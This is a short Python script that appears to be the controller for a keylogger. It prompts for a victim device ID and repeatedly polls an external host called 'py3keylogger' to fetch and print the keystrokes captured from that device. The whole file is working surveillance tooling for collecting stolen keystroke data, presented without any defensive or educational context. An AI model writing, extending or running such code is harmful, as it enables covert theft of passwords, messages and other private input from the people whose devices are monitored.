from types import new_class
import requests
import time

DEVICE_ID = input("Enter host device ID: ")

HOST = "https://py3keylogger.herokuapp.com"

prev_data = ""
new_data = ""
total_data = ""

while True:
    data = requests.get(f"{HOST}/fetch?device_id={DEVICE_ID}").json()
    if data["status"] == 200:
        new_data = data["body"]["new_data"]
        
        if new_data != prev_data:
            total_data += new_data
            print("Data received:", total_data)
            prev_data = new_data
        
        else:
            print("No new data yet...")
    
    else:
        print("Invalid device ID!")
        break
    time.sleep(3)
